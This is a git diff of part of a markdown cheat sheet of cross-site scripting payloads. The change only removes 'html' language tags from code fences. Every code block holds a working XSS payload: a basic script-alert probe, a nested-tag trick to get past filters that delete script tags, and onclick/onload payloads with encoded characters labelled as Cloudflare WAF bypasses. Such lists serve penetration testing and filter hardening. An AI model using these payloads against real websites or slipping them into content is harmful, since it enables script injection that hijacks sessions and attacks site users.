@@ -2,13 +2,13 @@
 
 ## Basic Payload
 
-```html
+```
 <script>alert(1);</script>
 ```
 
 ## Bypass Deleting Script Tag
 
-```html
+```
 <sc<script>ript>alert(1);</sc</script>ript>
 ```
 
@@ -16,7 +16,7 @@
 
 Cloudflare WAF
 
-```html
+```
 <a"/onclick=(confirm)()>Click Here!
 Dec: <svg onload=prompt%26%230000000040document.domain)>
 Hex: <svg onload=prompt%26%23x000000028;document.domain)>
